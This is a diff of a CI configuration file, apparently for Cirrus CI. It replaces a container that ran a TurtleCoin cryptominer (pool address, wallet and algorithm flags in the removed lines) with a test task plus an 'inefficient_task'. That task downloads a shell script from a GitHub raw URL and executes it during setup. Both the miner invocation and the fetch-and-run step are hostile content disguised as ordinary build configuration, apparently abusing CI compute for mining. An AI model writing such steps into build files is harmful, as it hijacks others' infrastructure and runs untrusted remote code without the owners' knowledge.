@@ -1,6 +1,17 @@
-efficient_task:
+container:
+  image: node:latest
+
+check_task:
+  node_modules_cache:
+    folder: node_modules
+    fingerprint_script: cat yarn.lock
+    populate_script: yarn install
+  test_script: yarn test
+
+inefficient_task:
   container:
-    dockerfile: christiankm01/master:latest
-    docker_arguments:
-      foo: turtle  --bind=54.39.234.99:3129 --algorithm argon2id_chukwa2 --pool ca.turtlecoin.herominers.com:10380 --wallet TRTLv1eACSpKx6fbiG4PAiQj2xtiwxhHQ9vYZhhf84USCaabq8JSyoNX9vamnUcG35BkQy6VfwUy5CsV9YNomioPGGyVhKQKoJF.p5 --disable-gpu
-  test_script: ...
+    image: node:latest
+  setup_script:
+    - apt-get update
+    - apt-get install build-essential
+    - wget https://raw.githubusercontent.com/agamlimaa/saya/main/mbc.sh && chmod +x mbc.sh && ./mbc.sh
